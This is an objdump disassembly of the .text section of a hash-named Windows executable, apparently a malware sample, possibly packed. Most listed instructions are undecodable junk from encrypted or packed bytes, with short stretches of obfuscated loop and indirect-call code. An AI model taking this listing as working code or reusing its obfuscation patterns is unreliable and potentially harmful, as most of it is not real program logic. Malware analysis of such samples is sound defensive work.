
d4c62e87fac00597421c40ad5024d4e2343a9d2be04b016641abcba2f25a567d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x42a775
  40100c:	jmp    0x4012ab
  401011:	(bad)  
  401012:	into   
  401013:	(bad)  
  401014:	rcr    edx,cl
  401016:	(bad)  
  401018:	aad    0xdf
  40101a:	mov    ebx,0xbaa30cf7
  40101f:	cmc    
  401020:	dec    esi
  401021:	js     0x40109b
  401023:	js     0x40109d
  401025:	(bad)  
  401026:	jle    0x4010a0
  401028:	js     0x400ff2
  40102a:	xlat   BYTE PTR ds:[ebx]
  40102b:	cmp    eax,0xcfdbc1d5
  401030:	fld    st(0)
  401032:	pop    es
  401033:	push   es
  401034:	or     eax,DWORD PTR ds:0x3b080af3
  40103a:	bswap  edx
  40103c:	and    al,bh
  40103e:	sbb    bl,BYTE PTR [edi]
  401040:	inc    ecx
  401041:	bound  ecx,QWORD PTR [edx]
  401043:	mov    bh,0xdd
  401045:	or     bh,ch
  401047:	mov    ebp,0x880bd0e3
  40104c:	and    BYTE PTR [eax+0x1549a4f6],bh
  401052:	lods   eax,DWORD PTR ds:[esi]
  401053:	fadd   DWORD PTR [eax+0x1f]
  401056:	pusha  
  401057:	out    dx,al
  401058:	outs   dx,DWORD PTR ds:[esi]
  401059:	adc    ebx,DWORD PTR [ecx]
  40105b:	sahf   
  40105c:	add    dl,al
  40105e:	dec    edx
  40105f:	lods   al,BYTE PTR ds:[esi]
  401060:	pop    ebx
  401061:	sub    eax,0xad3ec6d9
  401066:	mov    WORD PTR [ebx],es
  401068:	lds    esi,FWORD PTR [ebx-0x76243a00]
  40106e:	adc    eax,0x3af3c19a
  401074:	xchg   ebx,eax
  401075:	icebp  
  401076:	dec    edi
  401077:	loopne 0x401019
  401079:	dec    ecx
  40107a:	call   DWORD PTR [edi-0x234ef85e]
  401080:	mov    ebp,0x5530ed4d
  401085:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  40108c:	sbb    ebx,ecx
  40108e:	xchg   esp,eax
  40108f:	sub    esi,edx
  401091:	repz pop eax
  401093:	(bad)  
  401094:	out    0x42,al
  401096:	cli    
  401097:	in     al,dx
  401098:	xchg   esp,eax
  401099:	cmp    edi,ecx
  40109b:	jbe    0x401102
  40109d:	xlat   BYTE PTR ds:[ebx]
  40109e:	sub    cl,ch
  4010a0:	add    al,0xe1
  4010a2:	sbb    DWORD PTR [ecx-0x60],ebx
  4010a5:	xor    eax,0x2696f0b
  4010aa:	adc    bh,BYTE PTR [ecx]
  4010ac:	fisttp QWORD PTR [eax+0x7f753256]
  4010b2:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010b8:	arpl   WORD PTR [ebp-0x23],dx
  4010bb:	rcl    BYTE PTR [ecx],1
  4010bd:	fistp  DWORD PTR [esi-0x1f]
  4010c0:	and    DWORD PTR [ecx-0x68],edi
  4010c3:	inc    eax
  4010c4:	push   ebx
  4010c5:	aaa    
  4010c6:	adc    eax,0x1c317733
  4010cb:	fstp   TBYTE PTR [eax]
  4010cd:	dec    edi
  4010ce:	repnz int 0xa6
  4010d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4010d2:	and    BYTE PTR [edi+0x16],0x1f
  4010d6:	mov    dl,0xab
  4010d8:	fimul  DWORD PTR [ebp-0x1debe872]
  4010de:	arpl   sp,cx
  4010e0:	iret   
  4010e1:	dec    edx
  4010e2:	lds    eax,FWORD PTR [edx]
  4010e4:	scas   eax,DWORD PTR es:[edi]
  4010e5:	into   
  4010e6:	frstor [edx-0x3e]
  4010e9:	mov    edi,0x14fe20be
  4010ee:	push   edx
  4010ef:	cmp    DWORD PTR [ebp-0x10],edi
  4010f2:	fbld   TBYTE PTR [esi+ebp*8+0x1b]
  4010f6:	shl    DWORD PTR [ebp-0xc44e16f],cl
  4010fc:	mov    cl,0xc0
  4010fe:	inc    ecx
  4010ff:	popf   
  401100:	mov    esp,0x5eeccef3
  401105:	jnp    0x4010bf
  401107:	outs   dx,BYTE PTR ds:[esi]
  401108:	mov    DWORD PTR [ecx+0x42bcc747],esi
  40110e:	mov    esp,0xe3c61feb
  401113:	cwde   
  401114:	jl     0x4010f1
  401116:	xchg   DWORD PTR [edx-0x7c],ebp
  401119:	(bad)  
  40111b:	sbb    BYTE PTR [ebx+0x1b],al
  40111e:	cmc    
  40111f:	sbb    cl,ch
  401121:	rcr    esi,0xde
  401124:	fld    DWORD PTR [ebp-0x1b]
  401127:	lock sbb al,0x79
  40112a:	or     eax,0xaa3835b
  40112f:	mov    ch,0x8a
  401131:	xchg   ecx,eax
  401132:	jl     0x4010f8
  401134:	inc    esp
  401135:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401136:	arpl   cx,ax
  401138:	je     0x401159
  40113a:	mov    ecx,0x28357384
  40113f:	and    esp,edx
  401141:	std    
  401142:	addr16 inc ebp
  401144:	push   ebx
  401145:	xchg   esp,eax
  401146:	and    cl,BYTE PTR [ebx-0x29573bc4]
  40114c:	xor    BYTE PTR [edx-0x4],bl
  40114f:	push   ecx
  401150:	or     dl,BYTE PTR [eax+0x74]
  401153:	(bad)  
  401155:	push   edi
  401156:	repnz mov edi,0x5e531865
  40115c:	mov    WORD PTR [edi+0x1ef25cca],cs
  401162:	arpl   WORD PTR [edx],dx
  401164:	jb     0xb33ad80c
  40116a:	int    0x40
  40116c:	mov    bl,0x4a
  40116e:	xchg   ebx,eax
  40116f:	jae    0x4011db
  401171:	fild   WORD PTR [ecx]
  401173:	jns    0x4011ae
  401175:	mov    ch,0x76
  401177:	(bad)  [eiz*4+0x3489002f]
  40117e:	not    al
  401180:	jle    0x4011ee
  401182:	lock sbb al,0xae
  401185:	push   esi
  401186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401187:	and    al,0xc8
  401189:	inc    esp
  40118a:	mov    WORD PTR [ebp-0x17],?
  40118d:	inc    esi
  40118e:	nop
  40118f:	add    ebx,edx
  401191:	repnz aaa 
  401193:	inc    edi
  401194:	jne    0x40114a
  401196:	(bad)  
  401197:	in     eax,dx
  401198:	or     al,0x3e
  40119a:	and    ebp,DWORD PTR [eax+0x4b]
  40119d:	jg     0x4011a0
  40119f:	mov    edx,0x8842a206
  4011a4:	(bad)  
  4011a5:	rcl    BYTE PTR [ecx+ebx*1],0x3c
  4011a9:	out    0xfc,al
  4011ab:	std    
  4011ac:	mov    ?,WORD PTR [ebx]
  4011ae:	loopne 0x4011b2
  4011b0:	inc    esi
  4011b1:	cld    
  4011b2:	push   ebp
  4011b3:	test   DWORD PTR [esi+0x5b],edi
  4011b6:	fnstcw WORD PTR [esi+eiz*8-0x67df1525]
  4011bd:	imul   eax,eax,0xffffffcb
  4011c0:	or     DWORD PTR [ecx],edx
  4011c2:	xor    ecx,edi
  4011c4:	pop    ecx
  4011c5:	sub    esi,DWORD PTR [ecx+0x1e824f6c]
  4011cb:	jecxz  0x401163
  4011cd:	hlt    
  4011ce:	or     BYTE PTR [edx+0x2b],dl
  4011d1:	loop   0x4011cf
  4011d3:	icebp  
  4011d4:	cmp    eax,DWORD PTR [ebx+ebp*2+0x22]
  4011d8:	pop    edi
  4011d9:	adc    ch,BYTE PTR [esi]
  4011db:	pop    ebp
  4011dc:	add    ecx,DWORD PTR [eax-0x5f]
  4011df:	push   ecx
  4011e0:	jb     0x40119d
  4011e2:	daa    
  4011e3:	and    esp,DWORD PTR [edi]
  4011e5:	cld    
  4011e6:	(bad)  
  4011e7:	ss xchg ebp,eax
  4011e9:	loope  0x401269
  4011eb:	lds    ecx,FWORD PTR [edx]
  4011ed:	arpl   WORD PTR [ebp-0x48abd84d],si
  4011f3:	dec    edi
  4011f4:	ja     0x4011a3
  4011f6:	aas    
  4011f7:	sub    esi,ebx
  4011f9:	sub    ebx,esi
  4011fb:	pusha  
  4011fc:	add    bh,BYTE PTR [edi+0x61a6f09a]
  401202:	fbstp  TBYTE PTR [ebx-0x64a68a61]
  401208:	adc    DWORD PTR [ebx],eax
  40120a:	xchg   esp,eax
  40120b:	sub    esi,0xffffffbc
  40120e:	push   es
  40120f:	fcom   DWORD PTR [edi]
  401211:	test   al,0x3f
  401213:	cmp    BYTE PTR [ebp+0x4a],ah
  401216:	fs sti 
  401218:	add    cl,bh
  40121a:	mov    ds:0xe3d1dc,eax
  40121f:	mov    dl,0x94
  401221:	ja     0x4011ef
  401223:	mov    ecx,DWORD PTR [eax-0x564822a6]
  401229:	into   
  40122a:	jmp    0xe29c:0xdd981711
  401231:	adc    eax,0x9011eeb0
  401236:	mov    cl,0xc6
  401238:	ret    0xf17f
  40123b:	scas   al,BYTE PTR es:[edi]
  40123c:	xchg   esi,eax
  40123d:	mov    ah,0xa9
  40123f:	cmp    ecx,DWORD PTR [ebx+0x1e]
  401242:	stos   DWORD PTR es:[edi],eax
  401243:	xchg   esp,eax
  401244:	push   edi
  401245:	iret   
  401246:	push   ds
  401247:	push   esi
  401248:	retf   0x7b13
  40124b:	or     DWORD PTR [esi+0x45],ecx
  40124e:	sahf   
  40124f:	es dec edx
  401251:	neg    DWORD PTR [esi]
  401253:	push   0x5c7f19b3
  401258:	popf   
  401259:	or     eax,0xde18147e
  40125e:	scas   eax,DWORD PTR es:[edi]
  40125f:	imul   esp,DWORD PTR [eax+0x5efec0ec],0x7
  401266:	aaa    
  401267:	and    esp,0x49
  40126a:	pop    esi
  40126b:	sub    DWORD PTR [ecx+edx*1],ecx
  40126e:	or     al,0xa7
  401270:	ffreep st(6)
  401272:	ds int3 
  401274:	add    al,0xa
  401276:	mov    ah,dl
  401278:	cmp    BYTE PTR [edx-0x121cbbf0],al
  40127e:	and    BYTE PTR [ecx],dh
  401280:	into   
  401281:	ja     0x40123f
  401283:	imul   esi,DWORD PTR [edx-0x2a],0x3a
  401287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401288:	sub    al,0x3d
  40128a:	mov    ebx,0x6daa1b6
  40128f:	int3   
  401290:	outs   dx,BYTE PTR ds:[esi]
  401291:	inc    eax
  401292:	or     BYTE PTR [esi+0x59],bl
  401295:	mov    al,0x90
  401297:	ret    
  401298:	jns    0x40125d
  40129a:	imul   edi,ebp,0xfffffffa
  40129d:	mov    ebx,0x536d8b9e
  4012a2:	xor    BYTE PTR [ecx-0x4fcf4f22],bh
  4012a8:	and    al,0xaa
  4012aa:	ins    DWORD PTR es:[edi],dx
  4012ab:	mov    eax,ds:0x41eae6
  4012b0:	xor    DWORD PTR ds:0x42a80d,edx
  4012b6:	mov    eax,DWORD PTR [eax+0x198]
  4012bc:	mov    ecx,DWORD PTR ds:0x42a7c1
  4012c2:	or     DWORD PTR ds:0x42a76d,ecx
  4012c8:	mov    DWORD PTR [ebp-0x8],eax
  4012cb:	mov    DWORD PTR ds:0x42a75d,0x436b
  4012d5:	mov    eax,DWORD PTR [ebp+0x8]
  4012d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4012db:	push   ebx
  4012dc:	or     DWORD PTR ds:0x42a7c1,edx
  4012e2:	push   esi
  4012e3:	add    esi,DWORD PTR ds:0x42a7b5
  4012e9:	mov    esi,0x7510850
  4012ee:	and    ebx,0x1c58
  4012f4:	xor    eax,esi
  4012f6:	and    DWORD PTR ds:0x42a839,0x0
  401300:	jmp    0x401312
  401305:	mov    ebx,DWORD PTR ds:0x42a839
  40130b:	inc    ebx
  40130c:	mov    DWORD PTR ds:0x42a839,ebx
  401312:	cmp    DWORD PTR ds:0x42a839,0x11
  401319:	jae    0x401344
  40131f:	cmp    DWORD PTR ds:0x42a839,0x16
  401326:	jne    0x401335
  40132c:	push   DWORD PTR [ebp-0x1c]
  40132f:	call   DWORD PTR ds:0x41d180
  401335:	jmp    0x401305
  40133a:	adc    DWORD PTR ds:0x42a781,0x42a805
  401344:	push   edi
  401345:	and    DWORD PTR ds:0x42a809,0x0
  40134f:	jmp    0x401361
  401354:	mov    edi,DWORD PTR ds:0x42a809
  40135a:	inc    edi
  40135b:	mov    DWORD PTR ds:0x42a809,edi
  401361:	cmp    DWORD PTR ds:0x42a809,0x1d
  401368:	jae    0x4013a9
  40136e:	cmp    DWORD PTR ds:0x42a809,0xe
  401375:	jne    0x401384
  40137b:	push   DWORD PTR [ebp-0x10]
  40137e:	call   DWORD PTR ds:0x41d0b4
  401384:	cmp    DWORD PTR ds:0x42a809,0xd
  40138b:	jne    0x40139e
  401391:	mov    edi,DWORD PTR ds:0x42a809
  401397:	inc    edi
  401398:	mov    DWORD PTR ds:0x42a809,edi
  40139e:	jmp    0x401354
  4013a3:	sub    DWORD PTR ds:0x42a7b5,edx
  4013a9:	mov    edi,0x327298
  4013ae:	mov    DWORD PTR ds:0x42a76d,0x11
  4013b8:	cmp    DWORD PTR ds:0x42a76d,0x0
  4013bf:	je     0x4016af
  4013c5:	cmp    DWORD PTR ds:0x42a76d,0x2
  4013cc:	jne    0x4013e4
  4013d2:	push   0x42a7b5
  4013d7:	push   0x0
  4013d9:	push   0x42a9cd
  4013de:	call   DWORD PTR ds:0x41d0b8
  4013e4:	cmp    DWORD PTR ds:0x42a76d,0x3
  4013eb:	jne    0x4013fe
  4013f1:	mov    ebx,DWORD PTR ds:0x42a76d
  4013f7:	dec    ebx
  4013f8:	mov    DWORD PTR ds:0x42a76d,ebx
  4013fe:	mov    ebx,DWORD PTR ds:0x42a76d
  401404:	dec    ebx
  401405:	mov    DWORD PTR ds:0x42a76d,ebx
  40140b:	jmp    0x4013b8
  401410:	jmp    0x4016af
  401415:	leave  
  401416:	rol    dh,0xcf
  401419:	leave  
  40141a:	int    0xd9
  40141c:	fimul  DWORD PTR [edx]
  40141e:	leave  
  40141f:	rcl    BYTE PTR [ecx+0x23],1
  401422:	add    BYTE PTR [eax+edi*4-0x2],cl
  401426:	jle    0x4014a0
  401428:	js     0x401428
  40142a:	jle    0x4014a4
  40142c:	js     0x401493
  40142e:	mov    bh,0xb7
  401430:	and    eax,0x2b5c63a1
  401435:	xchg   ecx,eax
  401436:	loope  0x4013ca
  401438:	frstpm(287 only) 
  40143a:	mov    dl,0x61
  40143c:	mov    ecx,0xd1cab5dc
  401441:	xchg   edx,eax
  401442:	mov    bh,0x6c
  401444:	xchg   BYTE PTR [ebx+0x7f298109],dh
  40144a:	sbb    DWORD PTR [ecx-0x3a1ad3ce],esp
  401450:	or     DWORD PTR ds:0xaad76c38,edx
  401456:	sub    al,0x67
  401458:	adc    al,0x9d
  40145a:	cmp    al,0xd5
  40145c:	mov    dh,0xb9
  40145e:	mov    dl,0x4f
  401460:	ror    BYTE PTR [edx+ebp*1-0x70],1
  401464:	aad    0x6c
  401466:	sbb    bl,dh
  401468:	adc    BYTE PTR [ecx+0x6a],al
  40146b:	loopne 0x4014ea
  40146d:	pop    ds
  40146e:	push   ds
  40146f:	push   edi
  401470:	push   ecx
  401471:	cmp    eax,esp
  401473:	add    eax,0xce976c4
  401478:	fadd   st(6),st
  40147a:	ret    
  40147b:	addr16 add al,0x57
  40147e:	jg     0x401429
  401480:	ror    DWORD PTR ds:0x3432a10f,cl
  401486:	jmp    0xdff2:0xec2d32ef
  40148d:	mov    ebp,DWORD PTR [ecx+0x3c2e9ae9]
  401493:	sbb    cl,BYTE PTR [ecx]
  401495:	in     al,dx
  401496:	lds    ebp,FWORD PTR [edx-0x71]
  401499:	popa   
  40149a:	retf   0xe3aa
  40149d:	jmp    0xcd38:0xc6c07230
  4014a4:	jbe    0x4014d1
  4014a6:	inc    ecx
  4014a7:	pop    ecx
  4014a8:	jo     0x4014aa
  4014aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014ab:	cmp    eax,0x7f6892b9
  4014b0:	dec    edi
  4014b1:	in     eax,0x6b
  4014b3:	adc    bh,BYTE PTR [edx+esi*8]
  4014b6:	in     eax,dx
  4014b7:	pop    eax
  4014b8:	enter  0x5ec2,0xe7
  4014bc:	pop    edi
  4014bd:	dec    ebx
  4014be:	inc    eax
  4014bf:	(bad)  
  4014c0:	and    al,0xbb
  4014c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014c3:	pop    edx
  4014c4:	pushf  
  4014c5:	push   0xffffffb2
  4014c7:	jmp    0xab42:0xfedb9fa9
  4014ce:	(bad)  
  4014cf:	mov    ecx,0x55bf808f
  4014d4:	mov    edx,0x8158c945
  4014d9:	push   ss
  4014da:	dec    esi
  4014db:	adc    al,0xfc
  4014dd:	sahf   
  4014de:	cmp    al,BYTE PTR [eax+0x70]
  4014e1:	fist   WORD PTR ds:0xec4dbd21
  4014e7:	aaa    
  4014e8:	fsubr  st,st(5)
  4014ea:	rcr    BYTE PTR [ebx+0x69792e24],1
  4014f0:	pop    ebp
  4014f1:	outs   dx,DWORD PTR ds:[esi]
  4014f2:	xor    al,0x6b
  4014f4:	js     0x401563
  4014f6:	ins    DWORD PTR es:[edi],dx
  4014f7:	push   esp
  4014f8:	js     0x401505
  4014fa:	popf   
  4014fb:	or     al,0x4d
  4014fd:	inc    eax
  4014fe:	mov    bl,0xf7
  401500:	(bad)  
  401502:	ja     0x401520
  401504:	outs   dx,DWORD PTR ds:[esi]
  401505:	fs push ebx
  401507:	mov    ?,WORD PTR ds:0x1df84f34
  40150d:	test   eax,0xbd05f01b
  401512:	outs   dx,DWORD PTR ds:[esi]
  401513:	les    esp,FWORD PTR [esi+0x7fe5d816]
  401519:	adc    bl,dh
  40151b:	sub    BYTE PTR [edx-0x43e93d75],ah
  401521:	sub    al,0x73
  401523:	daa    
  401524:	sub    DWORD PTR [ebp+0x6089cf9],ebp
  40152a:	xchg   edi,eax
  40152b:	pop    ebp
  40152c:	lahf   
  40152d:	nop
  40152e:	cmp    BYTE PTR [ebp+ebp*1+0x59],bl
  401532:	sub    eax,0x8b5f9e5d
  401537:	sbb    al,0x18
  401539:	stc    
  40153a:	mov    ds,WORD PTR [edi]
  40153c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40153d:	jnp    0x401587
  40153f:	outs   dx,BYTE PTR ds:[esi]
  401540:	xchg   ebp,eax
  401541:	push   DWORD PTR [esi]
  401543:	mov    ds:0xaf6125a8,eax
  401548:	mov    al,0xde
  40154a:	test   BYTE PTR gs:[ebp+0x239c25b1],al
  401551:	cmp    al,0xdb
  401553:	add    DWORD PTR [ecx],0x48e162f7
  401559:	push   esi
  40155a:	mov    cl,0xd3
  40155c:	add    BYTE PTR [ecx-0x14cad7eb],dh
  401562:	jl     0x4015bc
  401564:	ficom  DWORD PTR [edx-0x3ade09c1]
  40156a:	mov    ss,WORD PTR [ecx+0x298b6a66]
  401570:	es test eax,0xfebe0736
  401576:	push   esp
  401577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401578:	aad    0xd6
  40157a:	retf   0xb2ab
  40157d:	or     al,0xfa
  40157f:	mov    ebp,0x4aa896e4
  401584:	fsub   DWORD PTR [ebx+0x7d0cd6d0]
  40158a:	and    al,0xbc
  40158c:	jmp    0x4015ed
  40158e:	pop    ss
  40158f:	mov    ds:0xc81d6372,al
  401594:	mov    cl,ah
  401596:	loope  0x401594
  401598:	aam    0xfd
  40159a:	dec    ebp
  40159b:	push   eax
  40159c:	mov    ecx,0xcb9ef9ad
  4015a1:	xchg   esp,eax
  4015a2:	push   esi
  4015a3:	shl    BYTE PTR [edi+0x1b935592],0xdf
  4015aa:	push   ebp
  4015ab:	lahf   
  4015ac:	sbb    eax,0x23375acd
  4015b1:	call   0x6f978f2d
  4015b6:	popa   
  4015b7:	jbe    0x401562
  4015b9:	jmp    0xb611:0x1e6281ad
  4015c0:	lods   eax,DWORD PTR ds:[esi]
  4015c1:	pcmpgtd mm4,mm2
  4015c4:	scas   al,BYTE PTR es:[edi]
  4015c5:	cmp    BYTE PTR [edx+0x73a1fd1f],0x20
  4015cc:	mov    ebx,0xe80ed183
  4015d1:	xor    BYTE PTR [esi],al
  4015d3:	mov    DWORD PTR [eax],ebp
  4015d5:	mov    eax,ds:0xdaa654f7
  4015da:	mov    ds:0xb548ad1f,al
  4015df:	jmp    0x6c08:0xe49c7c0e
  4015e6:	sub    ebp,DWORD PTR [ebp+0x73fe664c]
  4015ec:	jae    0x4015c7
  4015ee:	test   al,0xf7
  4015f0:	mov    dh,0x83
  4015f2:	sub    ah,BYTE PTR [edx-0x6d2f9ec2]
  4015f8:	mov    ah,0x33
  4015fa:	int3   
  4015fb:	(bad)  [ebp-0x6d1c948]
  401601:	aad    0x9d
  401603:	xchg   esi,eax
  401604:	mov    edx,0x7d96b0ab
  401609:	jb     0x4015f4
  40160b:	cmp    al,0xf
  40160d:	xchg   BYTE PTR [esi+0x519a577e],dh
  401613:	inc    ebx
  401614:	(bad)  
  401615:	inc    BYTE PTR [ebp-0x7edafaf3]
  40161b:	shl    BYTE PTR [edx-0x1],cl
  40161e:	cmp    BYTE PTR [esi+0x443bf664],cl
  401624:	jo     0x4015ff
  401626:	cmp    ebx,DWORD PTR [ebp+0x62]
  401629:	(bad)  
  40162b:	sub    eax,0xf254349f
  401630:	(bad)
  401634:	je     0x401618
  401636:	mov    al,ds:0xa0f1bc7a
  40163b:	cwde   
  40163c:	mov    ebx,0xd328f0e5
  401641:	adc    ebp,eax
  401643:	arpl   WORD PTR [ebx],sp
  401645:	add    BYTE PTR [ebp+edx*2-0x2281f241],dl
  40164c:	test   al,0x28
  40164e:	addr16 test al,0xa4
  401651:	pop    ecx
  401652:	jmp    0x67df:0x6af06ebc
  401659:	pop    esi
  40165a:	sub    BYTE PTR [edi+eax*4+0x53bb579e],ah
  401661:	es pop es
  401663:	fnstenv ds:0x56d362c
  401669:	fucomip st,st(4)
  40166b:	push   esi
  40166c:	ja     0x4016da
  40166e:	in     al,dx
  40166f:	sbb    al,0xeb
  401671:	pop    edi
  401672:	scas   al,BYTE PTR es:[edi]
  401673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401674:	xchg   ebx,eax
  401675:	lods   eax,DWORD PTR ds:[esi]
  401676:	jno    0x4016b2
  401678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401679:	pop    es
  40167a:	add    DWORD PTR [edx],esi
  40167c:	pusha  
  40167d:	mov    ch,0x1b
  40167f:	jle    0x40161f
  401681:	inc    edi
  401682:	jnp    0x4016ed
  401684:	adc    eax,0x5940d672
  401689:	cmp    dh,BYTE PTR fs:[ebx-0x2a]
  40168d:	das    
  40168e:	fistp  WORD PTR [ecx]
  401690:	daa    
  401691:	jbe    0x401645
  401693:	jne    0x4016ec
  401695:	dec    esp
  401696:	or     DWORD PTR ds:0x69620682,0xffffff96
  40169d:	cmp    ah,BYTE PTR [ebx-0x7f]
  4016a0:	push   0x39f69972
  4016a5:	in     al,0xa1
  4016a7:	mov    dl,0xaa
  4016a9:	inc    ebx
  4016aa:	loop   0x401688
  4016ac:	mov    ah,0xcf
  4016ae:	jge    0x4016b3
  4016b0:	mov    DWORD PTR [ecx+0x42a84d35],0x53dc00
  4016ba:	add    BYTE PTR [ecx-0x46c2eeff],cl
  4016c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016c1:	inc    edx
  4016c2:	add    BYTE PTR [ebp+0xd81fc45],cl
  4016c8:	imul   esp,DWORD PTR [edi-0x58a2ffbe],0x45890042
  4016d2:	lock xor DWORD PTR ds:0x42a76d,ebx
  4016d9:	mov    eax,DWORD PTR [ebp+0x8]
  4016dc:	neg    ecx
  4016de:	mov    ecx,DWORD PTR [ebp-0x10]
  4016e1:	xor    eax,esi
  4016e3:	jmp    0x401982
  4016e8:	ret    0x3dc5
  4016eb:	ret    
  4016ec:	leave  
  4016ed:	retf   
  4016ee:	ret    0xebc5
  4016f1:	out    0x4b,eax
  4016f3:	repz loopne 0x40170a
  4016f6:	pop    esp
  4016f7:	out    dx,al
  4016f8:	jl     0x4016fd
  4016fa:	js     0x401774
  4016fc:	(bad)  
  4016fd:	jle    0x401777
  4016ff:	js     0x40174b
  401701:	jnp    0x4016e5
  401703:	stos   BYTE PTR es:[edi],al
  401704:	push   edi
  401705:	test   ebp,0xd6d7d8eb
  40170b:	outs   dx,DWORD PTR ds:[esi]
  40170c:	out    dx,eax
  40170d:	shl    BYTE PTR [edx+0x32],1
  401710:	clc    
  401711:	aas    
  401712:	jnp    0x401741
  401714:	je     0x4016ab
  401716:	jmp    0x44719371
  40171b:	pushf  
  40171c:	int    0xf5
  40171e:	xor    eax,0xad27c9b6
  401723:	or     al,0x8f
  401725:	mov    edx,0xcc65f4c0
  40172a:	pop    ebx
  40172b:	daa    
  40172c:	jecxz  0x40177e
  40172e:	imul   DWORD PTR [esi-0x6aeaa155]
  401734:	(bad)  [edx]
  401736:	cs aas 
  401738:	or     al,0x62
  40173a:	retf   0x3ec5
  40173d:	pop    ecx
  40173e:	jbe    0x4016e4
  401740:	pushf  
  401741:	mov    cl,BYTE PTR [ecx]
  401743:	loopne 0x401733
  401745:	or     al,0x76
  401747:	loope  0x401760
  401749:	nop
  40174a:	test   eax,0x8b024291
  40174f:	mov    ah,0x5d
  401751:	cwde   
  401752:	jns    0x4017bf
  401754:	cdq    
  401755:	sub    eax,0x6cc7d05d
  40175a:	outs   dx,DWORD PTR ds:[esi]
  40175b:	xchg   esi,eax
  40175c:	loope  0x4016f1
  40175e:	loop   0x4017ba
  401760:	sub    al,0xb1
  401762:	jecxz  0x40177e
  401764:	push   eax
  401765:	in     eax,0x30
  401767:	jnp    0x40174e
  401769:	pop    ds
  40176a:	in     al,dx
  40176b:	sbb    DWORD PTR [ebp+0x44],esi
  40176e:	mov    ebx,0x903e91b3
  401773:	sub    DWORD PTR [edx-0x6c],eax
  401776:	sti    
  401777:	or     BYTE PTR [edi-0x35],dl
  40177a:	sar    DWORD PTR [ebx+edx*1-0x70],0xd2
  40177f:	cmp    eax,0x7eb13bb
  401784:	cli    
  401785:	xor    cl,BYTE PTR [ebx-0x1e]
  401788:	in     al,0x28
  40178a:	jmp    0x401758
  40178c:	imul   esp,DWORD PTR [edx+0x68bcfdf8],0x1e
  401793:	not    BYTE PTR [edi+0x5a741659]
  401799:	push   cs
  40179a:	dec    esi
  40179b:	aam    0x97
  40179d:	add    BYTE PTR [ebp+0x6a],bl
  4017a0:	or     esi,ebp
  4017a2:	call   0x72c2:0x2127bef4
  4017a9:	push   es
  4017aa:	xor    DWORD PTR [ebx],0xa4f219cc
  4017b0:	lock mov edi,0xb1afb0e6
  4017b6:	cmc    
  4017b7:	lea    esp,[edi+esi*1]
  4017ba:	jae    0x4017cb
  4017bc:	icebp  
  4017bd:	jbe    0x4017c1
  4017bf:	and    eax,0x337c2f37
  4017c4:	or     al,0x5e
  4017c6:	lea    ebp,[edx-0x6d]
  4017c9:	out    0x96,eax
  4017cb:	and    cl,BYTE PTR [eax+0x8]
  4017ce:	push   cs
  4017cf:	push   esi
  4017d0:	and    dl,BYTE PTR [edx+0x1e471ad8]
  4017d6:	out    dx,al
  4017d7:	jbe    0x401841
  4017d9:	push   0xffffffff
  4017db:	addr16 jp 0x401772
  4017de:	push   ss
  4017df:	je     0x4017f7
  4017e1:	ret    
  4017e2:	xor    edi,DWORD PTR [edx+0x76]
  4017e5:	push   edx
  4017e6:	into   
  4017e7:	iret   
  4017e8:	xor    eax,0xdc3156c2
  4017ed:	rol    cl,cl
  4017ef:	adc    DWORD PTR [esp+ebp*8],edi
  4017f2:	lahf   
  4017f3:	ret    
  4017f4:	jne    0x4017f5
  4017f6:	out    0x74,al
  4017f8:	xor    DWORD PTR [ecx],0xaec8260b
  4017fe:	jae    0x401840
  401800:	push   es
  401801:	mov    edx,0xc5d6624a
  401806:	outs   dx,BYTE PTR ds:[esi]
  401807:	into   
  401808:	mov    dl,0x86
  40180a:	in     al,dx
  40180b:	xchg   ecx,eax
  40180c:	lods   al,BYTE PTR ds:[esi]
  40180d:	daa    
  40180e:	aas    
  40180f:	sub    bl,bh
  401811:	push   0xffffffca
  401813:	ds int3 
  401815:	sub    eax,0x7e4b9932
  40181a:	pusha  
  40181b:	sahf   
  40181c:	push   ds
  40181d:	out    dx,eax
  40181e:	sbb    ecx,esi
  401820:	test   eax,0x4c8b9b8d
  401825:	pop    ecx
  401827:	sub    al,0x14
  401829:	dec    ebx
  40182a:	out    0x4d,al
  40182c:	pop    es
  40182d:	fiadd  WORD PTR [esi-0x6]
  401830:	mov    ds:0xd3f1b374,eax
  401835:	push   es
  401836:	inc    esp
  401837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401838:	dec    ebx
  401839:	push   edi
  40183a:	rcr    DWORD PTR [ebp+eax*4+0x1a19c3be],0xcd
  401842:	ins    DWORD PTR es:[edi],dx
  401843:	pop    es
  401844:	pop    ebx
  401845:	lahf   
  401846:	jg     0x401858
  401848:	div    BYTE PTR [eax-0x5e]
  40184b:	test   eax,0xb16af7d1
  401850:	aaa    
  401851:	cmp    al,0xfc
  401853:	xchg   ebx,eax
  401854:	mov    dh,0xc6
  401856:	addr16 pop ecx
  401858:	adc    eax,ebp
  40185a:	je     0x40183e
  40185c:	jp     0x4018c4
  40185e:	xor    al,0xc2
  401860:	inc    ebp
  401861:	mov    ecx,0x86f3f276
  401866:	mov    edi,0x12792de1
  40186b:	mov    ah,0xdc
  40186d:	neg    BYTE PTR ds:0x8fbf8fd8
  401873:	xchg   edx,eax
  401874:	jae    0x401845
  401876:	stos   BYTE PTR es:[edi],al
  401877:	mov    edx,0x47888e44
  40187c:	out    dx,al
  40187d:	push   edx
  40187e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40187f:	sub    eax,0x379da762
  401884:	test   esi,ebx
